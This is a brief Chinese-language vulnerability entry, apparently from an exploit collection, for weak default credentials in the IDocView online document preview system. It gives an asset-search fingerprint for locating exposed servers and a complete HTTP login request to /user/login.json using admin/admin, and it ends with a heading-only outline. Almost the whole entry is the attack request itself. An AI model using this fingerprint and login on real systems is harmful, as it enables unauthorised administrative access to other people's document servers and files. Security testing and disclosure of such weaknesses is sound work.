# IDocView在线文档预览系统存在弱口令漏洞

- **系统**：IDocView　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`app.name="I Doc View"`
- **请求**：`POST /user/login.json  HTTP/1.1`

**请求体 / payload**
```
登录页面
/user/login

弱口令
admin/admin
Host: xx.xx.xx.xx.xx
Cookie: JSESSIONIDocv=C09CF421845AEA9C6FB34B4363E5C167
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
user=admin&password=admin
```

**其他**
- I Doc View在线文档预览系统存在弱口令漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * I Doc View